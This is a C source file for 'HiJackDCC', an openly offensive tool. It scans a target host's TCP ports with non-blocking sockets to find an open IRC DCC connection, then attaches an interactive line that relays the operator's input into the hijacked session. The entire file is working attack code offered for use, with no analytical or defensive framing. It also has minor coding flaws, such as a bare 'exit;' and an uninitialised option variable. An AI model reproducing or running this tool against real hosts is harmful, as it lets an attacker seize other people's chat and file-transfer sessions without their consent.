// hijackdcc.c - by Permission Denied
// fast port scanner with interactive line

#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define LO_PORT 1025
#define N_PORT 10000
#define SL 250

struct sockaddr_in sind;
int socks[SL];
int LOW_PORT;
int NR_PORT;
int COUNT;
unsigned int ports[SL], counts[SL];
int sock;
unsigned int port;

unsigned int scan()
{
 int opt;
 int fre;
 int s, cc;

 fre = SL; s = 0;
 while(1) {
  if(s == SL) s = 0;
  if(ports[s] == 0xffff) {
   s++;
   continue;
  }
  if(ports[s] == 0)
   ports[s] = LOW_PORT + s;
  port = ports[s];
  if(socks[s] == 0) {
   if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))<0) {
    printf("No free socket\n");exit;
    }
   setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
   opt = O_NONBLOCK | fcntl(sock, F_GETFL);
   fcntl(sock, F_SETFL, opt);
   socks[s] = sock;
  } else
   sock = socks[s];
  sind.sin_port = htons(port);
  if((cc = connect(sock, (struct sockaddr *) &sind, sizeof(sind))) == 0) break;
  if(errno != EINPROGRESS && errno != EALREADY) {
//   printf("%d:%d:%d closed %d\n", s, counts[s], port, errno);
   close(sock); socks[s] = 0;
   if((ports[s] += SL) > LOW_PORT + NR_PORT) {
    if(++counts[s] == COUNT) {
     ports[s] = 0xffff;
     fre--;if(fre == 0) {
      printf("Cannot find opened DCC Connection\n"); exit(0);
     }
    } else ports[s] = LOW_PORT + s;
   }
  }
  s++;
 }
 printf("Find opened port at %d\n", port);
 
}

main(int argc, char **argv)
{
 struct hostent *fhe;
 fd_set arfds, awfds, rfds, wfds;
 char line[1000];
 int cc;
  
 LOW_PORT = LO_PORT;
 NR_PORT = N_PORT;
 COUNT = 1;
 if(argc<2 || argc>5) {
  printf("HiJackDCC by Maxiu\nUsage:\n %s <host> [<port>] [<counter>] [<nr_ports>]\n", argv[0]);return;
 }
 if(argc>2) LOW_PORT = atoi(argv[2]);
 if(argc>3) COUNT = atoi(argv[3]);
 if(argc>4) NR_PORT = atoi(argv[4]);
 for(cc = 0;cc < SL; cc++)
  ports[cc] = socks[cc] = counts[cc] = 0;
 bzero((char *) &sind, sizeof(sind));
 sind.sin_family = AF_INET;
 if (fhe = gethostbyname (argv[1]))
  bcopy(fhe -> h_addr, (char *) &sind.sin_addr, fhe -> h_length);
  else {
   printf("No host\n");return;
  }
 scan();
 FD_ZERO(&awfds);
 FD_ZERO(&arfds);
 FD_SET(sock, &arfds);
 FD_SET(0, &arfds);
 while (1) {
  bcopy((char *)&arfds, (char *)&rfds, sizeof(rfds));
  bcopy((char *)&awfds, (char *)&wfds, sizeof(rfds));
  
  if(select(getdtablesize(), &rfds, &wfds, (fd_set *) 0, (struct timeval *) 0) <0) {
   if (errno == EINTR) continue;
   printf("Connecion closed\n");
   break;
  }
  if (FD_ISSET(sock, &rfds)) {
   cc = read(sock, (char *) line, 1000);
   if(cc < 0) {
    printf("socket read error: %d\n", errno);
    return;
   }
   else if (cc == 0) {
    printf("\nConnection closed\n");
    break;
   }
   else
   {
    line[cc]='\0';
    fputs(line, stdout);
   }
  }
  if(FD_ISSET(0, &rfds)) {
   cc = read(0, (char *) line, 1000);
   if (cc<0) {
    printf("stdin read error: %d\n", errno);
    return;
   } else if (cc == 0) {
    printf("\nConnection closed\n");
    break;
   } else
    if(write(sock, line, cc) < 0) {
     printf("socket write error: %d\n", errno);
     return;
    }
   }
 } 
 close(sock);
}